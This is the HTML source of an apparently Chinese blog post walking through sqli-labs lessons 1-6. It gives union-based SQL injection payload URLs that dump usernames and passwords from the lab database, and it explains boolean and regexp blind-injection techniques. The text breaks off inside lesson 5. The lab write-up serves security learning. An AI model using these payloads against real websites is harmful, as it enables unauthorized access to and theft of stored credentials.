@@ -1,0 +1,1624 @@
+<!DOCTYPE html>
+<html lang="zh-hans">
+
+<head>
+    
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<meta name="HandheldFriendly" content="True" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon-32x32.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon-16x16.png" />
+<link rel="manifest" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/site.webmanifest" />
+<link rel="mask-icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/safari-pinned-tab.svg" color="#8aa2d3" />
+<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon.ico" />
+<meta name="theme-color" content="#ffffff" />
+
+
+<title>Sqli-labs-less 1-6 - Phoenix-Pl’s Blog</title>
+
+
+<meta name="author" content="DSRKafuU" />
+
+
+<meta name="description" content="A minimal Hugo theme with nice theme color." />
+
+
+<meta name="keywords" content="Sqli-labs" />
+
+
+<meta property="og:title" content="Sqli-labs-less 1-6" />
+<meta name="twitter:title" content="Sqli-labs-less 1-6" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://Phoenix-Pl.github.io/post/sqli-labs-less1-6/" /><meta property="og:description" content="预备知识 基础mysql语句： 查库： select schema_name from information_schema.schemata; 查表： select table_name from information_schema.tables where table_schema=&#39;security&#39;; 查字段： select column_name from information_schema.columns where table_name=&#39;users&#39;; 查表： select username,password from security.users; 辅助配置 找到sqli-labs-master 中 less-xx 中 index.php 添加以下代码 echo $sql; //将构造的Sql语句输出 echo &quot;&lt;br&gt;&quot;; //换行" />
+<meta name="twitter:description" content="预备知识 基础mysql语句： 查库： select schema_name from information_schema.schemata; 查表： select table_name from information_schema.tables where table_schema=&#39;security&#39;; 查字段： select column_name from information_schema.columns where table_name=&#39;users&#39;; 查表： select username,password from security.users; 辅助配置 找到sqli-labs-master 中 less-xx 中 index.php 添加以下代码 echo $sql; //将构造的Sql语句输出 echo &quot;&lt;br&gt;&quot;; //换行" /><meta property="og:image" content="https://Phoenix-Pl.github.io/img/og.png" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://Phoenix-Pl.github.io/img/og.png" /><meta property="article:published_time" content="2020-05-11T00:00:00+00:00" /><meta property="article:modified_time" content="2020-05-11T00:00:00+00:00" />
+
+
+<style>
+    @media (prefers-color-scheme: dark) {
+        body[data-theme='auto'] img {
+            filter: brightness(60%);
+        }
+    }
+
+    body[data-theme='dark'] img {
+        filter: brightness(60%);
+    }
+</style>
+
+
+
+<link rel="stylesheet" href="https://Phoenix-Pl.github.io/assets/css/fuji.min.css" />
+
+
+
+
+
+</head>
+
+<body data-theme="auto">
+    <script data-cfasync="false">
+  
+  var fujiThemeData = localStorage.getItem('fuji_data-theme');
+  
+  if (!fujiThemeData) {
+    localStorage.setItem('fuji_data-theme', 'auto');
+  } else {
+    
+    if (fujiThemeData !== 'auto') {
+      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
+    }
+  }
+</script>
+    <header>
+    <div class="container-lg clearfix">
+        <div class="col-12 header">
+            <a class="title-main" href="https://Phoenix-Pl.github.io/">Phoenix-Pl’s Blog</a>
+            
+            <span class="title-sub">书山有路勤为径，学海无涯苦作舟</span>
+            
+        </div>
+    </div>
+</header>
+
+    <main>
+        <div class="container-lg clearfix">
+            
+            <div class="col-12 col-md-9 float-left content">
+                
+<article>
+    
+    <h2 class="post-item post-title">
+        <a href="https://Phoenix-Pl.github.io/post/sqli-labs-less1-6/">Sqli-labs-less 1-6</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2020-05-11</span><span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;11829 字</span><span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/sqli-labs">Sqli-labs</a>&nbsp;</span>
+
+    </div>
+    
+    <div class="post-content markdown-body">
+        <h3 id="预备知识">预备知识</h3>
+<p><strong>基础mysql语句：</strong></p>
+<p><strong>查库：</strong></p>
+<pre><code class="language-sql">select schema_name from information_schema.schemata;
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015221739875.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>查表：</strong></p>
+<pre><code class="language-sql">select table_name from information_schema.tables where table_schema='security';
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015222110471.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>查字段：</strong></p>
+<pre><code class="language-sql">select column_name from information_schema.columns where table_name='users';
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015222456551.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>查表：</strong></p>
+<pre><code class="language-sql">select username,password from security.users;
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015222545932.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="辅助配置">辅助配置</h3>
+<p>找到<em>sqli-labs-master</em> 中 <em>less-xx</em>  中 <em>index.php</em> 添加以下代码
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015222610791.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<pre><code class="language-sql">echo $sql;     //将构造的Sql语句输出
+echo &quot;&lt;br&gt;&quot;;   //换行
+</code></pre>
+<p>来方便我们理解 <code>sql</code> 注入</p>
+<p>查字段：</p>
+<pre><code class="language-sql">select id,username,password from security.users;
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015222719211.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>
+<p>在 MySQL 中，可使用 <code>SHOW DATABASES;</code>语句来查看或显示当前用户权限范围以内的数据库。==对大小写不敏感==</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015222752626.png#pic_center" alt="在这里插入图片描述" />
+</p>
+</li>
+<li>
+<p>在MySQL中，可使用<code>use database;</code> 改变当前操作数据库</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015222820623.png#pic_center" alt="在这里插入图片描述" />
+</p>
+</li>
+<li>
+<p>在MySQL中，可使用<code>show tables;</code>显示数据库这个表
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015222853737.png#pic_center" alt="在这里插入图片描述" />
+</p>
+</li>
+<li>
+<p><code>select * from 表名称</code> //希望从 &ldquo;xxxx&rdquo; 表中选取所有的列。星号（*）是选取所有列的快捷方式。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015222931521.png#pic_center" alt="在这里插入图片描述" />
+</p>
+</li>
+<li>
+<p><code>SELECT *  FROM users WHERE id='1' LIMIT 0,1; </code> //显示表中所有id=1的内容</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015223043146.png#pic_center" alt="在这里插入图片描述" />
+</p>
+</li>
+<li>
+<p>limit 用法</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015223112319.png#pic_center" alt="在这里插入图片描述" />
+</p>
+</li>
+</ul>
+<p><strong>由此可知：limit a,b    a代表从第a+1个数据开始，b代表显示几个数据</strong></p>
+<ul>
+<li>
+<p><code>order by a</code>语句 //用与对列排序，<code>a</code>为列数   可用来判断表中有多少列</p>
+<ul>
+<li>
+<p>如果a大约列数，则报错
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015223221842.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020101522325951.png#pic_center" alt="在这里插入图片描述" />
+
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015223315866.png#pic_center" alt="在这里插入图片描述" />
+</p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>union select</code>  //联合查询，用来爆出显示位</p>
+</li>
+<li></li>
+</ul>
+<pre><code>union select 会把两条SQL 语句的查询结果拼接起来，形成一张虚拟的表。联合查询会实现跨库跨表查询，会极大减少SQL 注入的成本。
+</code></pre>
+<p><strong>PS:</strong></p>
+<h6 id="联合查询有两个限制条件">联合查询有两个限制条件</h6>
+<ol>
+<li>两条SQL 语句的查询结果具有相同的列数</li>
+<li>两条SQL 语句相同位置的列具有相同的数据类型</li>
+</ol>
+<blockquote>
+<p>什么是显示位？</p>
+<p>在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数
+据展示在页面中，这个展示数据的位置就叫显示位，我们可以利用这个显示位显示我们想查询到的内容</p>
+</blockquote>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015223455306.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="less-01">less-01</h3>
+<p><strong>1、判断注入类型</strong></p>
+<p>输入：<code>?id=1'</code>报错</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020101522353784.png#pic_center" alt="在这里插入图片描述" />
+
+从<code>'1'' LIMIT 0,1</code>可以看出，为字符型注入。那么就可以通过注释我们添加上的 <code>'</code> 后的内容执行查询。</p>
+<p>**PS：**从上述错误当中，我们可以看到提交到 sql 中的<code> 1’</code>在经过 sql 语句构造后形成 <code>'1'' LIMIT 0,1</code>，其本质是在查询的id参数两边使用单引号包裹，也就是<code>'$id'</code>这种情况，那么我们可以先加上一个单引号与前面的完成闭合，后面的单引号直接用–+或者#（需要编码为%23才能传参）注释掉，这样后面我们需要执行的SQL语句就能逃逸出来了</p>
+<p><strong>2、猜解字段</strong></p>
+<p>利用<code>order by</code> 猜解。</p>
+<p>二分法</p>
+<p>当输入大于3的数字时</p>
+<pre><code class="language-sql">http://127.0.0.1/sqli-labs-master/Less-1/?id=1' order by 4--+
+</code></pre>
+<p>发生报错<code>Unknown column '4' in 'order clause'</code></p>
+<p>输入3或3以下的数字，页面回显正常，说明字段数是3.</p>
+<p><strong>3、查看字段回显</strong></p>
+<p>这里注意，有的语句限制只能查看第一行可以选择查询参数为==-1==（一个表中不可能存在的值），这样查询内容为空才可以看到自己需要的内容</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015223646804.png#pic_center" alt="在这里插入图片描述" />
+
+查看字段回显，发现2和3的位置有回显。</p>
+<p><strong>4、爆出数据库</strong>
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015223745417.png#pic_center" alt="在这里插入图片描述" />
+
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015223817460.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>@@datadir  //mysql 的安装路径</li>
+</ul>
+<p><strong>5、爆出表名</strong></p>
+<p>很明显在限制查询一行的时候<code>group_concat(schema_name)</code>这种可以一次性查出所有信息的方式更方便一些，以下是三种字符串连接函数</p>
+<ul>
+<li>
+<ol>
+<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>
+</ol>
+</li>
+<li>
+<ol>
+<li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li>
+</ol>
+</li>
+<li>
+<ol>
+<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</li>
+</ol>
+</li>
+</ul>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
+</code></pre>
+<p><strong>但是最好不要引入单引号</strong>，这里最好使用16进制，也就是在去掉security两边的单引号 然后在它的前面加上==0x== 然后选中security进行16进制编码 也就是点击<strong>HackerBar</strong>   ==Encoding==下级的==Hex Encode==</p>
+<p>即：</p>
+<pre><code>http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020101522395952.png#pic_center" alt="在这里插入图片描述" />
+
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015224019902.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>6、爆出列名</strong></p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'--+
+</code></pre>
+<p><strong>同样最好不要引入单引号</strong>，这里最好使用16进制，也就是在去掉security两边的单引号 然后在它的前面加上==0x== 然后选中 <em>security</em> 以及 <em>users</em> 进行16进制编码 也就是点击<strong>HackerBar</strong>   ==Encoding==下级的==Hex Encode==</p>
+<p>即：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015224146660.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015224238172.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>7、爆内容</strong></p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(username,0x7e,password) from security.users--+
+</code></pre>
+<p>也可以：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(concat_ws('0x7e',username,password)) from security.users--+
+</code></pre>
+<p><strong>0x7e</strong>： 0x是十六进制标志，7e是十进制的126，是ascii中的 &lsquo;~&rsquo; ，用以分割pasword和username。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015224314677.png#pic_center" alt="在这里插入图片描述" />
+
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015224332702.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="less-02">less-02</h3>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-2/?id=1'
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015224412462.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>单引号闭合后报错如下</strong></p>
+<pre><code class="language-sql">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1
+</code></pre>
+<p>根据报错信息<code>' LIMIT 0,1</code>，可知为数字型注入。</p>
+<p>以这里的奇数个单引号破坏了查询，导致抛出错误，也就是说执行语句没有了单引号，所以payload也不需要单引号闭合，其余的和less-1都一样</p>
+<p>payload:</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,group_concat(concat_ws('0x7e',username,password)) from security.users--+
+</code></pre>
+<h3 id="less-03">less-03</h3>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-3/?id=1'
+</code></pre>
+<p>报错：</p>
+<pre><code class="language-sql">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015224448614.png#pic_center" alt="在这里插入图片描述" />
+
+从<code>1'') LIMIT 0,1</code>可以看出是字符型注入，闭合方式为<code>')</code>，其余的和less-1都一样</p>
+<p>payload：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,2,group_concat(concat_ws('0x7e',username,password)) from security.users--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015224512504.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="less-04">less-04</h3>
+<p>输入单引号测试，发现页面正常，</p>
+<pre><code class="language-sql">http://127.0.0.1/sqli-labs-master/Less-4/?id=1'
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015224538364.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>输入双引号测试，</p>
+<pre><code class="language-sql">http://192.168.2.222/sqli-labs-master/Less-4/?id=1&quot;
+</code></pre>
+<p>报错：</p>
+<pre><code class="language-sql">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at line 1
+</code></pre>
+<p>根据<code>&quot;1&quot;&quot;) LIMIT 0,1</code> ，可推断为字符型注入，闭合方式为<code>&quot;)</code> ，其余和less-01一样</p>
+<p>payload:</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,2,group_concat(concat_ws('0x7e',username,password)) from security.users--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201015224602956.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="less-05盲注">less-05(盲注)</h3>
+<h4 id="基础知识">基础知识：</h4>
+<p><strong>盲注：</strong>==盲注==就是<strong>在 sql 注入过程中, sql 语句执行的选择后, 选择的数据不能==回显== 到前端页面. 此时, 我们需要利用一些方法进行判断或者尝试</strong>, 这个过程称之为==盲注==,这种情况下往往需要<strong>一个一个字符的去猜解, 需要用到截取字符串</strong>.</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019213157812.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>0x01 基于布尔 SQL 盲注</strong></p>
+<p>我们可以利用<strong>逻辑判断</strong>进行盲注, 而布尔注入能够利用的根本就是, <strong>我们能够看到true和false返回页面内容不一致</strong></p>
+<p>因为不知道字段是怎样的, 因此只能一个字符一个字符的猜, 所以这里我们需要先学习字符串截取函数:<code>left()</code>, <code>right()</code>,<code>substr()</code>, <code>substring()</code>, <code>mid()</code>, 以及经常一起配套使用的ascii转换函数<code>ascii()</code>, <code>ord()</code>, 最后还有一些配合使用的mysql语句: <code>IF()</code>,<code>IFNULL()</code>,<code>SELECT CASE WHEN</code></p>
+<p><strong><code>left()</code>和<code>right()</code></strong></p>
+<p><strong>语法如下:</strong></p>
+<pre><code>left(string, n)
+--得到字符串string左边n个字符
+
+right(string, n)
+--得到字符串string右边n个字符
+</code></pre>
+<p>一般地, 我们使用<code>left(database(),1) &gt; 'a'</code>,查看数据库名第一位, <code>left(database(),2) &gt; 'ab'</code>,查看数据库名前二位.
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019213404174.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>**<code>right()</code>**用法类似, 只不过方向反了 , 从后往前</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019213518701.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong><code>substr()</code>, <code>substring()</code>, <code>mid()</code></strong></p>
+<pre><code>用法1: substr(str, pos, len)
+用法2: substr(str FROM pos FOR len)
+--从字符串str的第pos个字符串开始取, 只取len个字符
+--str: 要处理的字符串
+--pos: 开始的位置(初始值是1)
+--len: 截取的长度
+</code></pre>
+<blockquote>
+<p>ps: <code>substr(str FROM pos FOR len)</code>是应对<strong>逗号</strong>被过滤的情况</p>
+</blockquote>
+<p>比方说, 从<code>abcde</code>的第二个字符开始取, 只取3个字符, 这里分别演示<code>substr()</code>, <code>substring()</code>和<code>mid()</code>函数</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019213620281.png#pic_center" alt="在这里插入图片描述" />
+
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019213644926.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019213654206.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>看到这里，基本可以应对一些简单的bool注入的情况了, 所以, 下面我大概讲一下bool的注入流程. 比如说, 原始的sql语句如下:</p>
+<pre><code class="language-sql">SELECT username FROM users WHERE id=1;
+</code></pre>
+<p>然后我们发现, 当注入<code>and 1=1</code>的时候, 页面返回正常, 注入<code>and 1=2</code>的时候页面返回不正常, 那么我们就可以初步判断为bool注入了</p>
+<blockquote>
+<p>ps: 其实只要true和false返回的页面不同, 我们能够区别出来就行</p>
+</blockquote>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019213741112.png#pic_center" alt="在这里插入图片描述" />
+
+这里假设我们想拿到它的数据库名称, 首先要拿到数据库长度, 因为知道数据库长度之后, 我们才知道什么时候停止注入</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019214116630.png#pic_center" alt="在这里插入图片描述" />
+
+在实战中, 我们会使用<code>substr(DATABASE(),1,1) &gt; 'a'</code>,查看数据库名第一位, <code>substr(DATABASE(),2,1)</code> ,查看数据库名第二位, 依次猜解各个字符.</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019214338448.png#pic_center" alt="在这里插入图片描述" />
+
+<strong><code>ascii()</code>和<code>ord()</code></strong>
+在有些情况下, 引号可能被过滤, 所以这里需要将字符转换成ascii, 也就是数字表示, 那就不需要引号括起来了</p>
+<p><strong>ascii()</strong>
+&ndash;将第一个字符转换 为 ascii 值</p>
+<p><strong>ord()</strong>
+&ndash;将第一个字符转换 为 ascii 值</p>
+<pre><code>ps: 两个函数都是只转换第一个字符. 两个函数唯一的区别是, ord()函数遇到多字节, 比如说汉字, 会将汉字转换成 ((first byte ASCII code)*256+(second byte ASCII code))[*256+third byte ASCII code...] 用ascii表示多字节字符代码 的这种形式
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019214732736.png#pic_center" alt="在这里插入图片描述" />
+
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019214916867.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>因此, 为了避免引号被过滤的问题, 我们通常会用下面的注入语句去盲注数据库</p>
+<p>ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101</p>
+<p>然后用二分法来测试ascii码值, 然后再递增substr(str, pos, len)中的pos值, 即第一个字符找到后, 找第二个字符, 以此类推, 这里我们先拆开分析一下该注入语句</p>
+<p>先查数据库中的第一个表的名字</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019215245619.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>然后用字符串截取函数, 得到该表的第一个字符</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019220116594.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>接着用<code>ascii()</code>函数将该字符转换成ascii码</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019220145975.png#pic_center" alt="在这里插入图片描述" />
+最后就是穷举测试了, 当条件满足时:
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019220531144.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>当条件不满足时:</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019220558761.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<blockquote>
+<p>ps: 返回1和0代表true与false, 在实战中, 两种结果的页面会不一致, 这个具体在下面实战中会具体讨论.</p>
+</blockquote>
+<p><strong>IF(),IFNULL(),SELECT CASE WHEN</strong></p>
+<p><strong>IF()</strong></p>
+<p><strong>IF()语法如下:</strong></p>
+<blockquote>
+<p>IF(expr1, expr2, expr3)
+&ndash;如果 expr1 是TRUE(expr1 &lt;&gt; 0 and expr2 &lt;&gt; NULL), 则IF()的返回值为 expr2; 否则返回值则为 expr3.</p>
+</blockquote>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019221307582.png#pic_center" alt="在这里插入图片描述" />
+
+<strong><code>IFNULL()</code>和<code>CAST()</code></strong></p>
+<p><strong>语法如下:</strong></p>
+<pre><code>IFNULL(expr1,expr2)
+--如果 `expr1` 不是 NULL,则返回 `expr1`, 否则它返回 `expr2`. 
+</code></pre>
+<p>正常用法如下:</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019221953139.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<blockquote>
+<p>CAST(expression AS data_type)
+&ndash;将expression转换为data_type这种数据类型
+&ndash;我们常用的data_type是CHAR字符类型</p>
+</blockquote>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019222310590.png#pic_center" alt="在这里插入图片描述" />
+
+接着配合我们之前学过的<code>ORD()</code>和<code>MID()</code>函数, 注入语句如下: 返回第一个字符的ASCII码</p>
+<pre><code class="language-sql">SELECT ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users LIMIT 0,1),1,1));
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019223908777.png#pic_center" alt="在这里插入图片描述" />
+
+然后就是一步步的判断一下第一个字符的ascii码的区间, 以及同样操作判断第二个字符了</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020101922414087.png#pic_center" alt="在这里插入图片描述" />
+
+因为最后需要转换成ascii, 所以中间需要case转换成char, 不然是中文就坏事儿了
+SELECT CASE WHEN</p>
+<p><strong>语法如下:</strong></p>
+<p>CAST WHEN condition THEN result [WHEN &hellip;] [ELSE result] END
+&ndash;类似于其他语言的if/else 语句</p>
+<p><strong>例子如下:</strong></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019224801812.png#pic_center" alt="在这里插入图片描述" />
+
+通常结合<code>sleep()</code>函数使用</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019225016537.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>regexp 正则注入</strong></p>
+<pre><code>如果这种单个字符的爆破无法使用, 也即是说, 字符串无法拆分,这时候可以使用正则表达式
+</code></pre>
+<p>用法介绍</p>
+<pre><code class="language-sql">select user() regexp '^[a-z]';
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019225402765.png#pic_center" alt="在这里插入图片描述" />
+
+正则表达式的用法, 假设<code>user()</code>结果为 <code>root, regexp </code>后面接匹配 <code>root</code> 的正则表达式</p>
+<p>第二位可以用 <code>select user() regexp '^ro'</code>来进行. 如下图</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020101922571252.png#pic_center" alt="在这里插入图片描述" />
+
+当正确的时候显示结果为 1, 不正确的时候显示结果为 0</p>
+<pre><code>在Mysql5+中, information_schema库中存储了所有的库名, 表名以及字段名信息, 故攻击方式如下:
+</code></pre>
+<p>1、先判断第一个表名的第一个字符是否是<code>a-z</code>中的字符,其中<code>security</code>是假设已知的库名.</p>
+<pre><code>    注：正则表达式中 ^[a-z] 表示字符串中开始字符是在 a-z范围内
+
+index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP '^[a-z]' LIMIT 0,1) /*
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019230735349.png#pic_center" alt="在这里插入图片描述" />
+
+2、接下来判断第一个字符是否是<code>a-e</code>中的字符
+接下来判断第一个字符是否是<code>a-e</code>中的字符</p>
+<pre><code class="language-sql">index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP '^[a-e]' LIMIT 0,1)/*
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/202010192313052.png#pic_center" alt="在这里插入图片描述" />
+
+3、接下来确定该字符是<code>e</code></p>
+<pre><code class="language-sql">index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP '^e' LIMIT 0,1) /*
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019232053777.png#pic_center" alt="在这里插入图片描述" />
+4、接下来更换表达式:</p>
+<pre><code class="language-sql">'^e[a-z]' -&gt; '^em[a-z]' -&gt; '^ema[a-z]' -&gt; '^emai[a-z]' -&gt; '^email[a-z]' -&gt; '^emails[a-z]'-&gt; FALSE
+</code></pre>
+<p>这时说明表名为emails , 要验证是否是该表明 正则表达式为'^emails$', 但是没这必要 直接判断 table_name = &lsquo;emails&rsquo; 不就行了? 当然, 如果=被过滤就不可以了</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019233609233.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<blockquote>
+<p>ps: 如何知道匹配结束了? 这里大部分根据一般的命名方式(经验)就可以判断. 但是如何你在无法判断的情况下, 可以用 table_name
+regexp &lsquo;^emails$&lsquo;来进行判断. ^是从开头进行匹配, $是从结尾开始判断.</p>
+</blockquote>
+<p>5、接下来猜解其他表, 如假设我们知道其中包含users表,则如下语句说明这样子是正确的</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020101923415891.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<blockquote>
